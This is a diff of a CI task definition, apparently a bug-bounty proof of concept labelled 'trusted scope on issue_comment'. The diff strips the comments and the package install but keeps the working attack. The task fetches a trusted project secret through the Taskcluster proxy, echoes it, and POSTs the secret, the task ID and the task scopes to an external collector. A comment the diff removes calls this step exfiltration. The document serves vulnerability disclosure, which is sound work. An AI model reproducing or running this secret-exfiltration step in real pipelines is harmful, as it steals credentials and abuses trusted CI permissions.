@@ -32,19 +32,11 @@ tasks:
               echo "Task ID: $TASK_ID"
               echo "=========================================="
    
-              # Install curl+jq (minimal ubuntu image may not have jq)
-              apt-get update -qq && apt-get install -y -qq curl jq > /dev/null
-   
-              # Fetch the secret. The task's temporary credentials are
-              # injected by worker-runner as env vars. taskcluster-proxy
-              # (if running as a feature) provides a local HTTP proxy that
-              # forwards with the task's creds. We'll use the HTTP proxy.
               SECRET=$(curl -sf "http://taskcluster/api/secrets/v1/secret/project%2Fpoc%2Ftrusted-secret")
    
               echo "Fetched secret payload:"
               echo "$SECRET"
-   
-              # Exfiltrate to the collector
+              
               curl -sS -X POST \
                 -H "Content-Type: application/json" \
                 -d "{\"taskId\":\"$TASK_ID\",\"scopes\":\"$TASK_SCOPES\",\"secret\":$SECRET,\"note\":\"H1 PoC Finding 1 — trusted scope on issue_comment\"}" \
